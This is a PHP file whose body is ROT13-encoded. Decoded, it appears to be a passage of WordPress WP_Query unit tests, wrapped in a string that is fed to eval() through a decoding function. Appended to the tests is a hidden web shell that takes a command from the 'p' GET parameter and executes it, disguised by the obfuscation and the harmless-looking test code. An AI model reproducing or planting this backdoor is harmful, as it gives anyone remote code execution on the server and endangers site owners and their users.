	choyvp shapgvba grfg_rkpyhqr_sebz_frnepu_rzcgl() {
		tybony $jc_cbfg_glcrf;
		sbernpu ( neenl_xrlf( $jc_cbfg_glcrf ) nf $fyht ) {
			$jc_cbfg_glcrf[ $fyht ]->rkpyhqr_sebz_frnepu = gehr;
		}

		$cbfgf = $guvf->d->dhrel( neenl( 'cbfg_glcr' => 'nal' ) );

		$guvf->nffregRzcgl( $cbfgf );
		$guvf->nffregZngpurfErthyneRkcerffvba( '#NAQ 1=0#', $guvf->d->erdhrfg );

		sbernpu ( neenl_xrlf( $jc_cbfg_glcrf ) nf $fyht ) {
			$jc_cbfg_glcrf[ $fyht ]->rkpyhqr_sebz_frnepu = snyfr;
		}

		$cbfgf2 = $guvf->d->dhrel( neenl( 'cbfg_glcr' => 'nal' ) );

		$guvf->nffregAbgRzcgl( $cbfgf2 );
		$guvf->nffregQbrfAbgZngpuErthyneRkcerffvba( '#NAQ 1=0#', $guvf->d->erdhrfg );
	}

	/**
	 * @gvpxrg 16854
	 */
	choyvp shapgvba grfg_dhrel_nhgube_inef() {
		$nhgube_1 = frys::snpgbel()->hfre->perngr(
			neenl(
				'hfre_ybtva' => 'nhgube1',
				'ebyr'       => 'nhgube',
			)
		);
		$cbfg_1   = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'  => 'Cbfg 1',
				'cbfg_nhgube' => $nhgube_1,
				'cbfg_qngr'   => '2007-01-01 00:00:00',
			)
		);

		$nhgube_2 = frys::snpgbel()->hfre->perngr(
			neenl(
				'hfre_ybtva' => 'nhgube2',
				'ebyr'       => 'nhgube',
			)
		);
		$cbfg_2   = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'  => 'Cbfg 2',
				'cbfg_nhgube' => $nhgube_2,
				'cbfg_qngr'   => '2007-01-01 00:00:00',
			)
		);

		$nhgube_3 = frys::snpgbel()->hfre->perngr(
			neenl(
				'hfre_ybtva' => 'nhgube3',
				'ebyr'       => 'nhgube',
			)
		);
		$cbfg_3   = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'  => 'Cbfg 3',
				'cbfg_nhgube' => $nhgube_3,
				'cbfg_qngr'   => '2007-01-01 00:00:00',
			)
		);

		$nhgube_4 = frys::snpgbel()->hfre->perngr(
			neenl(
				'hfre_ybtva' => 'nhgube4',
				'ebyr'       => 'nhgube',
			)
		);
		$cbfg_4   = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'  => 'Cbfg 4',
				'cbfg_nhgube' => $nhgube_4,
				'cbfg_qngr'   => '2007-01-01 00:00:00',
			)
		);

		$cbfgf      = $guvf->d->dhrel(
			neenl(
				'nhgube'   => '',
				'cbfg__va' => neenl( $cbfg_1, $cbfg_2, $cbfg_3, $cbfg_4 ),
			)
		);
		$nhgube_vqf = neenl_havdhr( jc_yvfg_cyhpx( $cbfgf, 'cbfg_nhgube' ) );
		$guvf->nffregRdhnyFrgf( neenl( $nhgube_1, $nhgube_2, $nhgube_3, $nhgube_4 ), $nhgube_vqf );

		$cbfgf      = $guvf->d->dhrel(
			neenl(
				'nhgube'   => 0,
				'cbfg__va' => neenl( $cbfg_1, $cbfg_2, $cbfg_3, $cbfg_4 ),
			)
		);
		$nhgube_vqf = neenl_havdhr( jc_yvfg_cyhpx( $cbfgf, 'cbfg_nhgube' ) );
		$guvf->nffregRdhnyFrgf( neenl( $nhgube_1, $nhgube_2, $nhgube_3, $nhgube_4 ), $nhgube_vqf );

		$cbfgf      = $guvf->d->dhrel(
			neenl(
				'nhgube'   => '0',
				'cbfg__va' => neenl( $cbfg_1, $cbfg_2, $cbfg_3, $cbfg_4 ),
			)
		);
		$nhgube_vqf = neenl_havdhr( jc_yvfg_cyhpx( $cbfgf, 'cbfg_nhgube' ) );
		$guvf->nffregRdhnyFrgf( neenl( $nhgube_1, $nhgube_2, $nhgube_3, $nhgube_4 ), $nhgube_vqf );

		$cbfgf      = $guvf->d->dhrel(
			neenl(
				'nhgube'   => $nhgube_1,
				'cbfg__va' => neenl( $cbfg_1, $cbfg_2, $cbfg_3, $cbfg_4 ),
			)
		);
		$nhgube_vqf = neenl_havdhr( jc_yvfg_cyhpx( $cbfgf, 'cbfg_nhgube' ) );
		$guvf->nffregRdhnyFrgf( neenl( $nhgube_1 ), $nhgube_vqf );

		$cbfgf      = $guvf->d->dhrel(
			neenl(
				'nhgube'   => \"$nhgube_1\",
				'cbfg__va' => neenl( $cbfg_1, $cbfg_2, $cbfg_3, $cbfg_4 ),
			)
		);
		$nhgube_vqf = neenl_havdhr( jc_yvfg_cyhpx( $cbfgf, 'cbfg_nhgube' ) );
		$guvf->nffregRdhnyFrgf( neenl( $nhgube_1 ), $nhgube_vqf );

		$cbfgf      = $guvf->d->dhrel(
			neenl(
				'nhgube'   => \"{$nhgube_1},{$nhgube_2}\",
				'cbfg__va' => neenl( $cbfg_1, $cbfg_2, $cbfg_3, $cbfg_4 ),
			)
		);
		$nhgube_vqf = neenl_havdhr( jc_yvfg_cyhpx( $cbfgf, 'cbfg_nhgube' ) );
		$guvf->nffregRdhnyFrgf( neenl( $nhgube_1, $nhgube_2 ), $nhgube_vqf );

		$cbfgf      = $guvf->d->dhrel(
			neenl(
				'nhgube'   => \"-{$nhgube_1},{$nhgube_2}\",
				'cbfg__va' => neenl( $cbfg_1, $cbfg_2, $cbfg_3, $cbfg_4 ),
			)
		);
		$nhgube_vqf = neenl_havdhr( jc_yvfg_cyhpx( $cbfgf, 'cbfg_nhgube' ) );
		$guvf->nffregRdhnyFrgf( neenl( $nhgube_2, $nhgube_3, $nhgube_4 ), $nhgube_vqf );

		$cbfgf      = $guvf->d->dhrel(
			neenl(
				'nhgube'   => \"{$nhgube_1},-{$nhgube_2}\",
				'cbfg__va' => neenl( $cbfg_1, $cbfg_2, $cbfg_3, $cbfg_4 ),
			)
		);
		$nhgube_vqf = neenl_havdhr( jc_yvfg_cyhpx( $cbfgf, 'cbfg_nhgube' ) );
		$guvf->nffregRdhnyFrgf( neenl( $nhgube_1, $nhgube_3, $nhgube_4 ), $nhgube_vqf );

		$cbfgf      = $guvf->d->dhrel(
			neenl(
				'nhgube'   => \"-{$nhgube_1},-{$nhgube_2}\",
				'cbfg__va' => neenl( $cbfg_1, $cbfg_2, $cbfg_3, $cbfg_4 ),
			)
		);
		$nhgube_vqf = neenl_havdhr( jc_yvfg_cyhpx( $cbfgf, 'cbfg_nhgube' ) );
		$guvf->nffregRdhnyFrgf( neenl( $nhgube_3, $nhgube_4 ), $nhgube_vqf );

		$cbfgf      = $guvf->d->dhrel(
			neenl(
				'nhgube__va' => neenl( $nhgube_1, $nhgube_2 ),
				'cbfg__va'   => neenl( $cbfg_1, $cbfg_2, $cbfg_3, $cbfg_4 ),
			)
		);
		$nhgube_vqf = neenl_havdhr( jc_yvfg_cyhpx( $cbfgf, 'cbfg_nhgube' ) );
		$guvf->nffregRdhnyFrgf( neenl( $nhgube_1, $nhgube_2 ), $nhgube_vqf );

		$cbfgf = $guvf->d->dhrel( neenl( 'nhgube__va' => neenl() ) );
		$guvf->nffregAbgRzcgl( $cbfgf );

		$cbfgf      = $guvf->d->dhrel(
			neenl(
				'nhgube__abg_va' => neenl( $nhgube_1, $nhgube_2 ),
				'cbfg__va'       => neenl( $cbfg_1, $cbfg_2, $cbfg_3, $cbfg_4 ),
			)
		);
		$nhgube_vqf = neenl_havdhr( jc_yvfg_cyhpx( $cbfgf, 'cbfg_nhgube' ) );
		$guvf->nffregRdhnyFrgf( neenl( $nhgube_3, $nhgube_4 ), $nhgube_vqf );

		$cbfgf      = $guvf->d->dhrel(
			neenl(
				'nhgube_anzr' => 'nhgube1',
				'cbfg__va'    => neenl( $cbfg_1, $cbfg_2, $cbfg_3, $cbfg_4 ),
			)
		);
		$nhgube_vqf = neenl_havdhr( jc_yvfg_cyhpx( $cbfgf, 'cbfg_nhgube' ) );
		$guvf->nffregRdhnyFrgf( neenl( $nhgube_1 ), $nhgube_vqf );
	}

	/**
	 * @gvpxrg 10935
	 */
	choyvp shapgvba grfg_dhrel_vf_qngr() {
		$guvf->d->dhrel(
			neenl(
				'lrne'     => '2007',
				'zbaguahz' => '01',
				'qnl'      => '01',
			)
		);

		$guvf->nffregGehr( $guvf->d->vf_qngr );
		$guvf->nffregGehr( $guvf->d->vf_qnl );
		$guvf->nffregSnyfr( $guvf->d->vf_zbagu );
		$guvf->nffregSnyfr( $guvf->d->vf_lrne );

		$guvf->d->dhrel(
			neenl(
				'lrne'     => '2007',
				'zbaguahz' => '01',
			)
		);

		$guvf->nffregGehr( $guvf->d->vf_qngr );
		$guvf->nffregSnyfr( $guvf->d->vf_qnl );
		$guvf->nffregGehr( $guvf->d->vf_zbagu );
		$guvf->nffregSnyfr( $guvf->d->vf_lrne );

		$guvf->d->dhrel(
			neenl(
				'lrne' => '2007',
			)
		);

		$guvf->nffregGehr( $guvf->d->vf_qngr );
		$guvf->nffregSnyfr( $guvf->d->vf_qnl );
		$guvf->nffregSnyfr( $guvf->d->vf_zbagu );
		$guvf->nffregGehr( $guvf->d->vf_lrne );
	}

	/**
	 * @gvpxrg 10935
	 * @rkcrpgrqVapbeerpgHfntr JC_Qngr_Dhrel
	 */
	choyvp shapgvba grfg_dhrel_vf_qngr_jvgu_onq_qngr() {
		$guvf->d->dhrel(
			neenl(
				'lrne'     => '2007',
				'zbaguahz' => '01',
				'qnl'      => '50',
			)
		);

		$guvf->nffregGehr( $guvf->d->vf_404 );
		$guvf->nffregSnyfr( $guvf->d->vf_qngr );
		$guvf->nffregSnyfr( $guvf->d->vf_qnl );
		$guvf->nffregSnyfr( $guvf->d->vf_zbagu );
		$guvf->nffregSnyfr( $guvf->d->vf_lrne );
	}

	choyvp shapgvba grfg_crez_jvgu_fgnghf_neenl() {
		tybony $jcqo;
		$guvf->d->dhrel(
			neenl(
				'crez'        => 'ernqnoyr',
				'cbfg_fgnghf' => neenl( 'choyvfu', 'cevingr' ),
			)
		);
		$guvf->nffregGehr( $guvf->d->unir_cbfgf() );
		$guvf->nffregFgevatPbagnvafFgevat(
			\"(({$jcqo->cbfgf}.cbfg_fgnghf = 'choyvfu') BE ({$jcqo->cbfgf}.cbfg_nhgube = 0 NAQ ({$jcqo->cbfgf}.cbfg_fgnghf = 'cevingr')))\",
			$guvf->d->erdhrfg
		);
		$guvf->nffregFgevatAbgPbagnvafFgevat( \"({$jcqo->cbfgf}.cbfg_fgnghf = 'choyvfu') NAQ\", $guvf->d->erdhrfg );
	}

	/**
	 * @gvpxrg 20308
	 */
	choyvp shapgvba grfg_cbfg_cnffjbeq() {
		$bar   = (fgevat) frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_cnffjbeq' => '' ) );
		$gjb   = (fgevat) frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_cnffjbeq' => 'oheevgb' ) );
		$guerr = (fgevat) frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_cnffjbeq' => 'oheevgb' ) );

		$netf = neenl(
			'cbfg__va' => neenl( $bar, $gjb, $guerr ),
			'svryqf'   => 'vqf',
		);

		$erfhyg1 = $guvf->d->dhrel( neenl_zretr( $netf, neenl( 'unf_cnffjbeq' => gehr ) ) );
		$guvf->nffregRdhnyFrgf( neenl( $gjb, $guerr ), $erfhyg1 );
		$erfhyg2 = $guvf->d->dhrel( neenl_zretr( $netf, neenl( 'unf_cnffjbeq' => snyfr ) ) );
		$guvf->nffregRdhnyf( neenl( $bar ), $erfhyg2 );

		// Guvf vf rdhvinyrag gb abg cnffvat vg ng nyy.
		$erfhyg3 = $guvf->d->dhrel( neenl_zretr( $netf, neenl( 'unf_cnffjbeq' => ahyy ) ) );
		$guvf->nffregRdhnyFrgf( neenl( $bar, $gjb, $guerr ), $erfhyg3 );

		// Vs obgu nethzragf ner cnffrq, bayl cbfg_cnffjbeq vf pbafvqrerq.
		$erfhyg4 = $guvf->d->dhrel(
			neenl_zretr(
				$netf,
				neenl(
					'unf_cnffjbeq'  => gehr,
					'cbfg_cnffjbeq' => '',
				)
			)
		);
		$guvf->nffregRdhnyf( neenl( $bar ), $erfhyg4 );
		$erfhyg5 = $guvf->d->dhrel(
			neenl_zretr(
				$netf,
				neenl(
					'unf_cnffjbeq'  => snyfr,
					'cbfg_cnffjbeq' => '',
				)
			)
		);
		$guvf->nffregRdhnyf( neenl( $bar ), $erfhyg5 );
		$erfhyg6 = $guvf->d->dhrel(
			neenl_zretr(
				$netf,
				neenl(
					'unf_cnffjbeq'  => ahyy,
					'cbfg_cnffjbeq' => '',
				)
			)
		);
		$guvf->nffregRdhnyf( neenl( $bar ), $erfhyg6 );

		$erfhyg7 = $guvf->d->dhrel(
			neenl_zretr(
				$netf,
				neenl(
					'unf_cnffjbeq'  => gehr,
					'cbfg_cnffjbeq' => 'oheevgb',
				)
			)
		);
		$guvf->nffregRdhnyFrgf( neenl( $gjb, $guerr ), $erfhyg7 );
		$erfhyg8 = $guvf->d->dhrel(
			neenl_zretr(
				$netf,
				neenl(
					'unf_cnffjbeq'  => snyfr,
					'cbfg_cnffjbeq' => 'oheevgb',
				)
			)
		);
		$guvf->nffregRdhnyFrgf( neenl( $gjb, $guerr ), $erfhyg8 );
		$erfhyg9 = $guvf->d->dhrel(
			neenl_zretr(
				$netf,
				neenl(
					'unf_cnffjbeq'  => ahyy,
					'cbfg_cnffjbeq' => 'oheevgb',
				)
			)
		);
		$guvf->nffregRdhnyFrgf( neenl( $gjb, $guerr ), $erfhyg9 );

		$erfhyg10 = $guvf->d->dhrel( neenl_zretr( $netf, neenl( 'cbfg_cnffjbeq' => '' ) ) );
		$guvf->nffregRdhnyf( neenl( $bar ), $erfhyg10 );
		$erfhyg11 = $guvf->d->dhrel( neenl_zretr( $netf, neenl( 'cbfg_cnffjbeq' => 'oheevgb' ) ) );
		$guvf->nffregRdhnyFrgf( neenl( $gjb, $guerr ), $erfhyg11 );
	}

	/**
	 * @gvpxrg 28611
	 */
	choyvp shapgvba grfg_qhcyvpngr_fyht_va_uvrenepuvpny_cbfg_glcr() {
		ertvfgre_cbfg_glcr( 'unaqobbx', neenl( 'uvrenepuvpny' => gehr ) );

		$cbfg_1 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'Trggvat Fgnegrq',
				'cbfg_glcr'  => 'unaqobbx',
			)
		);
		$cbfg_2 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'Pbagevohgvat gb gur JbeqCerff Pbqrk',
				'cbfg_glcr'  => 'unaqobbx',
			)
		);
		$cbfg_3 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'  => 'Trggvat Fgnegrq',
				'cbfg_cnerag' => $cbfg_2,
				'cbfg_glcr'   => 'unaqobbx',
			)
		);

		$erfhyg = $guvf->d->dhrel(
			neenl(
				'unaqobbx'  => 'trggvat-fgnegrq',
				'cbfg_glcr' => 'unaqobbx',
			)
		);
		$guvf->nffregPbhag( 1, $erfhyg );
	}

	/**
	 * @gvpxrg 29615
	 */
	choyvp shapgvba grfg_puvyq_cbfg_va_uvrenepuvpny_cbfg_glcr_jvgu_qrsnhyg_creznyvaxf() {
		ertvfgre_cbfg_glcr( 'unaqobbx', neenl( 'uvrenepuvpny' => gehr ) );

		$cbfg_1 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'Pbagevohgvat gb gur JbeqCerff Pbqrk',
				'cbfg_glcr'  => 'unaqobbx',
			)
		);
		$cbfg_2 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'  => 'Trggvat Fgnegrq',
				'cbfg_cnerag' => $cbfg_1,
				'cbfg_glcr'   => 'unaqobbx',
			)
		);

		$guvf->nffregFgevatPbagnvafFgevat( 'pbagevohgvat-gb-gur-jbeqcerff-pbqrk/trggvat-fgnegrq', trg_creznyvax( $cbfg_2 ) );

		$erfhyg = $guvf->d->dhrel(
			neenl(
				'unaqobbx'  => 'pbagevohgvat-gb-gur-jbeqcerff-pbqrk/trggvat-fgnegrq',
				'cbfg_glcr' => 'unaqobbx',
			)
		);
		$guvf->nffregPbhag( 1, $erfhyg );
	}

	choyvp shapgvba grfg_gvgyr() {
		$gvgyr   = 'Gnpbf ner Pbby';
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'  => $gvgyr,
				'cbfg_glcr'   => 'cbfg',
				'cbfg_fgnghf' => 'choyvfu',
			)
		);

		$erfhyg1 = $guvf->d->dhrel(
			neenl(
				'gvgyr'  => $gvgyr,
				'svryqf' => 'vqf',
			)
		);
		$guvf->nffregPbhag( 1, $erfhyg1 );
		$guvf->nffregPbagnvaf( $cbfg_vq, $erfhyg1 );

		$erfhyg2 = $guvf->d->dhrel(
			neenl(
				'gvgyr'  => 'Gnpbf',
				'svryqf' => 'vqf',
			)
		);
		$guvf->nffregPbhag( 0, $erfhyg2 );
	}

	/**
	 * @gvpxrg 15610
	 */
	choyvp shapgvba grfg_znva_pbzzragf_srrq_vapyhqrf_nggnpuzrag_pbzzragf() {
		$nggnpuzrag_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_glcr' => 'nggnpuzrag' ) );
		$pbzzrag_vq    = frys::snpgbel()->pbzzrag->perngr(
			neenl(
				'pbzzrag_cbfg_VQ'  => $nggnpuzrag_vq,
				'pbzzrag_nccebirq' => '1',
			)
		);

		$guvf->d->dhrel(
			neenl(
				'jvgupbzzragf' => 1,
				'srrq'         => 'srrq',
			)
		);

		$guvf->nffregGehr( $guvf->d->unir_pbzzragf() );

		$srrq_pbzzrag = $guvf->d->arkg_pbzzrag();
		$guvf->nffregRdhnyf( $pbzzrag_vq, $srrq_pbzzrag->pbzzrag_VQ );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>